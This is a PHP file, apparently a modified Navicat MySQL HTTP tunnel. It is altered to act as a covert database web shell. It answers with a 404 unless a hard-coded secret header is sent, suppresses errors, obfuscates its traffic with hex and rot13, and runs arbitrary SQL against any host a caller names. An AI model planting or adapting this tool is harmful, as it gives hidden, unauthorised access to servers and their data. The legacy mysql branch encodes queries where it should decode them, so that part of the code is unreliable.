<?php
function check(){
    $token = "1wedasd";
    if ($_SERVER['HTTP_TOKEN'] != $token){
        header('HTTP/1.1 404 ');
        exit;
    }
}
check();

function Encode($data){

    $hexData = bin2hex($data);
    $encode = str_rot13($hexData);
//    $encode = openssl_encrypt($data, "AES-128-CBC", $key, OPENSSL_RAW_DATA, $iv);

    return bin2hex($encode);

}
function Decode($data){
    $hexData = hex2bin($data);
    $decode = str_rot13($hexData);
//    $rust = openssl_decrypt($hexData, "AES-128-CBC", $key, OPENSSL_RAW_DATA, $iv);
    return $decode;
}

// decode
$postData = Decode($_POST["data"]);

$arrData = json_decode($postData,true);

$versionNum = 206; // remark: require update CC_HTTP_TUNNEL_SCRIPT_LATEST_VERSION_MYSQL

//set allowTestMenu to false to disable System/Server test page
$allowTestMenu = true;

$use_mysqli = function_exists("mysqli_connect");

header("Content-Type: text/plain; charset=x-user-defined");
error_reporting(0);
set_time_limit(0);

function phpversion_int()
{
    list($maVer, $miVer, $edVer) = preg_split("(/|\.|-)", phpversion());
    return $maVer*10000 + $miVer*100 + $edVer;
}

if (phpversion_int() < 50300)
{
    set_magic_quotes_runtime(0);
}

function GetLongBinary($num)
{
    return pack("N",$num);
}

function GetShortBinary($num)
{
    return pack("n",$num);
}

function GetDummy($count)
{
    $str = "";
    for($i=0;$i<$count;$i++)
        $str .= "\x00";
    return $str;
}

function GetBlock($val)
{
    $len = strlen($val);
    if( $len < 254 )
        return chr($len).$val;
    else
        return "\xFE".GetLongBinary($len).$val;
}

function EchoHeader($errno)
{
    global $versionNum;

    $str = GetLongBinary(1111);
    $str .= GetShortBinary($versionNum);
    $str .= GetLongBinary($errno);
    $str .= GetDummy(6);

    echo Encode($str);

//    echo $str;
}

function EchoConnInfo($conn)
{
    if ($GLOBALS['use_mysqli']) {
        $str = GetBlock(mysqli_get_host_info($conn));
        $str .= GetBlock(mysqli_get_proto_info($conn));
        $str .= GetBlock(mysqli_get_server_info($conn));


        echo (Encode($str));
        //echo $str;
    } else {
        $str = GetBlock(mysql_get_host_info($conn));
        $str .= GetBlock(mysql_get_proto_info($conn));
        $str .= GetBlock(mysql_get_server_info($conn));
        echo (Encode($str));
//        echo $str;
    }
}

function EchoResultSetHeader($errno, $affectrows, $insertid, $numfields, $numrows)
{
    $str = GetLongBinary($errno);
    $str .= GetLongBinary($affectrows);
    $str .= GetLongBinary($insertid);
    $str .= GetLongBinary($numfields);
    $str .= GetLongBinary($numrows);
    $str .= GetDummy(12);
    echo (Encode($str));

//    echo $str;
}

function EchoFieldsHeader($res, $numfields)
{
    $str = "";
    for( $i = 0; $i < $numfields; $i++ ) {
        if ($GLOBALS['use_mysqli']) {
            $finfo = mysqli_fetch_field_direct($res, $i);
            $str .= GetBlock($finfo->name);
            $str .= GetBlock($finfo->table);

            $type = $finfo->type;
            $length = $finfo->length;

            $str .= GetLongBinary($type);

            $intflag = $finfo->flags;
            $str .= GetLongBinary($intflag);

            $str .= GetLongBinary($length);
        } else {
            $str .= GetBlock(mysql_field_name($res, $i));
            $str .= GetBlock(mysql_field_table($res, $i));

            $type = mysql_field_type($res, $i);
            $length = mysql_field_len($res, $i);
            switch ($type) {
                case "int":
                    if( $length > 11 ) $type = 8;
                    else $type = 3;
                    break;
                case "real":
                    if( $length == 12 ) $type = 4;
                    elseif( $length == 22 ) $type = 5;
                    else $type = 0;
                    break;
                case "null":
                    $type = 6;
                    break;
                case "timestamp":
                    $type = 7;
                    break;
                case "date":
                    $type = 10;
                    break;
                case "time":
                    $type = 11;
                    break;
                case "datetime":
                    $type = 12;
                    break;
                case "year":
                    $type = 13;
                    break;
                case "blob":
                    if( $length > 16777215 ) $type = 251;
                    elseif( $length > 65535 ) $type = 250;
                    elseif( $length > 255 ) $type = 252;
                    else $type = 249;
                    break;
                default:
                    $type = 253;
            }
            $str .= GetLongBinary($type);

            $flags = explode( " ", mysql_field_flags ( $res, $i ) );
            $intflag = 0;
            if(in_array( "not_null", $flags )) $intflag += 1;
            if(in_array( "primary_key", $flags )) $intflag += 2;
            if(in_array( "unique_key", $flags )) $intflag += 4;
            if(in_array( "multiple_key", $flags )) $intflag += 8;
            if(in_array( "blob", $flags )) $intflag += 16;
            if(in_array( "unsigned", $flags )) $intflag += 32;
            if(in_array( "zerofill", $flags )) $intflag += 64;
            if(in_array( "binary", $flags)) $intflag += 128;
            if(in_array( "enum", $flags )) $intflag += 256;
            if(in_array( "auto_increment", $flags )) $intflag += 512;
            if(in_array( "timestamp", $flags )) $intflag += 1024;
            if(in_array( "set", $flags )) $intflag += 2048;
            $str .= GetLongBinary($intflag);

            $str .= GetLongBinary($length);
        }
    }
    echo (Encode($str));

//    echo $str;
}

function EchoData($res, $numfields, $numrows)
{
    for( $i = 0; $i < $numrows; $i++ ) {
        $str = "";
        $row = null;
        if ($GLOBALS['use_mysqli'])
            $row = mysqli_fetch_row( $res );
        else
            $row = mysql_fetch_row( $res );
        for( $j = 0; $j < $numfields; $j++ ){
            if( is_null($row[$j]) )
                $str .= "\xFF";
            else
                $str .= GetBlock($row[$j]);
        }
        echo (Encode($str));

//        echo $str;
    }
}


if (phpversion_int() < 40005) {
    EchoHeader(201);
//    echo GetBlock("unsupported php version");
    echo (Encode(GetBlock("unsupported php version")));

    exit();
}

if (phpversion_int() < 40010) {
    global $HTTP_POST_VARS;
    $_POST = &$HTTP_POST_VARS;
}

if (!isset($arrData["Actn"]) || !isset($arrData["Host"]) || !isset($arrData["Port"]) || !isset($arrData["Login"])) {
    $testMenu = $allowTestMenu;
    if (!$testMenu){
        EchoHeader(202);
//        echo GetBlock("invalid parameters");
        echo (Encode(GetBlock("invalid parameters")));

        exit();
    }
}

if (!$testMenu){
    if ($arrData["EncodeBase64"] == '1') {
        for($i=0;$i<count($_POST["q"]);$i++)

            //$_POST["q"][$i] = base64_decode($_POST["q"][$i]);
            $_POST["q"][$i] = Decode(($_POST["q"][$i]));

    }

    if (!function_exists("mysql_connect") && !function_exists("mysqli_connect")) {
        EchoHeader(203);
//        echo GetBlock("MySQL not supported on the server");
        echo (Encode(GetBlock("MySQL not supported on the server")));

        exit();
    }

    $errno_c = 0;
    $hs = $arrData["Host"];
    if ($use_mysqli) {
        mysqli_report(MYSQLI_REPORT_OFF);
        if( $arrData["Port"] )
            $conn = mysqli_connect($hs, $arrData["Login"], $arrData["Password"], '', $arrData["Port"]);
        else
            $conn = mysqli_connect($hs, $arrData["Login"], $arrData["Password"]);
        $errno_c = mysqli_connect_errno();
        if($errno_c > 0) {
            EchoHeader($errno_c);
//            echo GetBlock(mysqli_connect_error());
            echo (Encode(GetBlock(mysqli_connect_error())));

            exit;
        }
        if (phpversion_int() >= 50005){  // for unicode database name
            mysqli_set_charset($conn, 'UTF8');
        }

        if(($errno_c <= 0) && ( $arrData["Db"] != "" )) {
            $res = mysqli_select_db($conn, $arrData["Db"] );
            $errno_c = mysqli_errno($conn);
        }

        EchoHeader($errno_c);
        if($errno_c > 0) {
            echo (Encode(GetBlock(mysqli_error($conn))));

//            echo GetBlock(mysqli_error($conn));
        } elseif($arrData["Actn"] == "C") {
            EchoConnInfo($conn);
        } elseif($arrData["Actn"] == "Q") {
            for($i=0;$i<count($_POST["q"]);$i++) {
                //$query = $_POST["q"][$i];
                $query = Decode(($_POST["q"][$i]));
                if($query == "") continue;
                if (phpversion_int() < 50400){
                    if(get_magic_quotes_gpc())
                        $query = stripslashes($query);
                }
                mysqli_real_query($conn, $query);
                $res = false;
                if (mysqli_field_count($conn))
                    $res = mysqli_store_result($conn);
                $errno = mysqli_errno($conn);
                $affectedrows = mysqli_affected_rows($conn);
                $insertid = mysqli_insert_id($conn);
                if (false !== $res) {
                    $numfields = mysqli_field_count($conn);
                    $numrows = mysqli_num_rows($res);
                }
                else {
                    $numfields = 0;
                    $numrows = 0;
                }
                EchoResultSetHeader($errno, $affectedrows, $insertid, $numfields, $numrows);
                if($errno > 0)
//                    echo GetBlock(mysqli_error($conn));
                    echo (Encode(GetBlock(mysqli_error($conn))));
                else {
                    if($numfields > 0) {
                        EchoFieldsHeader($res, $numfields);
                        EchoData($res, $numfields, $numrows);
                    } else {
                        if(phpversion_int() >= 40300)
//                            echo GetBlock(mysqli_info($conn));
                            echo (Encode(GetBlock(mysqli_info($conn))));
                        else
//                            echo GetBlock("");
                            echo (Encode(GetBlock("")));

                    }
                }
                if($i<(count($_POST["q"])-1))
//                    echo "\x01";
                    echo (Encode("\x01"));
                else
//                    echo "\x00";
                    echo (Encode("\x00"));

                if (false !== $res)
                    mysqli_free_result($res);
            }
        }
    } else {
        if( $arrData["Port"] ) $hs .= ":".$arrData["Port"];
        $conn = mysql_connect($hs, $arrData["Login"], $arrData["Password"]);
        $errno_c = mysql_errno();
        if (phpversion_int() >= 50203){  // for unicode database name
            mysql_set_charset('UTF8', $conn);
        }
        if(($errno_c <= 0) && ( $arrData["Db"] != "" )) {
            $res = mysql_select_db( $arrData["Db"], $conn);
            $errno_c = mysql_errno();
        }

        EchoHeader($errno_c);
        if($errno_c > 0) {
//            echo GetBlock(mysql_error());
            echo (Encode(GetBlock(mysql_error())));

        } elseif($arrData["Actn"] == "C") {
            EchoConnInfo($conn);
        } elseif($arrData["Actn"] == "Q") {
            for($i=0;$i<count($_POST["q"]);$i++) {
                //$query = $_POST["q"][$i];
                $query = Encode(($_POST["q"][$i]));

                if($query == "") continue;
                if (phpversion_int() < 50400){
                    if(get_magic_quotes_gpc())
                        $query = stripslashes($query);
                }
                $res = mysql_query($query, $conn);
                $errno = mysql_errno();
                $affectedrows = mysql_affected_rows($conn);
                $insertid = mysql_insert_id($conn);
                $numfields = mysql_num_fields($res);
                $numrows = mysql_num_rows($res);
                EchoResultSetHeader($errno, $affectedrows, $insertid, $numfields, $numrows);
                if($errno > 0)
                    echo (Encode(GetBlock(mysql_error())));

//                    echo GetBlock(mysql_error());
                else {
                    if($numfields > 0) {
                        EchoFieldsHeader($res, $numfields);
                        EchoData($res, $numfields, $numrows);
                    } else {
                        if(phpversion_int() >= 40300)
                            echo (Encode(GetBlock(mysql_info($conn))));

//                            echo GetBlock(mysql_info($conn));
                        else
                            echo (Encode(GetBlock("")));

//                            echo GetBlock("");
                    }
                }
                if($i<(count($_POST["q"])-1))
//                    echo "\x01";
                    echo (Encode("\x01"));
                else
//                    echo "\x00";
                    echo (Encode("\x00"));

                mysql_free_result($res);
            }
        }
    }
    exit();
}

header("Content-Type: text/html");

?>